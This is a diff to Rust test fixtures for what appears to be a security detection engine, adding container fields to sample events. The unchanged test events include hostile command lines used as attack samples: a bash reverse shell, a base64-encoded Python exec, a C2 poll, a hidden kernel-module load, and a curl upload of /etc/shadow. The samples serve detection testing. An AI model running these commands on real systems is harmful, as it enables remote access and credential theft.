@@ -42,6 +42,10 @@ mod tests {
         dst_domain: None,
         command_line: Some("ls -la /home/user/documents".to_string()),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -63,6 +67,10 @@ mod tests {
         dst_domain: Some("www.google.com".to_string()),
         command_line: Some("curl https://www.google.com".to_string()),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -84,6 +92,10 @@ mod tests {
         dst_domain: None,
         command_line: Some("vim /home/user/notes.txt".to_string()),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -109,6 +121,10 @@ mod tests {
         dst_domain: None,
         command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -134,6 +150,10 @@ mod tests {
             "python3 -c 'import base64;exec(base64.b64decode(\"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldA==\"))'".to_string()
         ),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -158,6 +178,10 @@ mod tests {
         dst_domain: Some("x7f3a2b.dynamic-dns.net".to_string()),
         command_line: Some("curl -s https://x7f3a2b.dynamic-dns.net/c2/poll".to_string()),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -181,6 +205,10 @@ mod tests {
         dst_domain: None,
         command_line: Some("insmod /tmp/.hidden/payload.ko".to_string()),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -206,6 +234,10 @@ mod tests {
             "curl -X POST -d @/etc/shadow https://198.51.100.99:31337/upload".to_string()
         ),
         event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
     }
     }
 
@@ -583,6 +615,10 @@ mod tests {
                 dst_domain: None,
                 command_line: Some("ls -la /home/user/documents/work".to_string()),
                 event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
             };
             normal_alarms += engine.observe(&event).len();
         }
@@ -608,6 +644,10 @@ mod tests {
                 dst_domain: None,
                 command_line: Some(obfuscated.to_string()),
                 event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
             };
             attack_alarms += engine.observe(&event).len();
         }
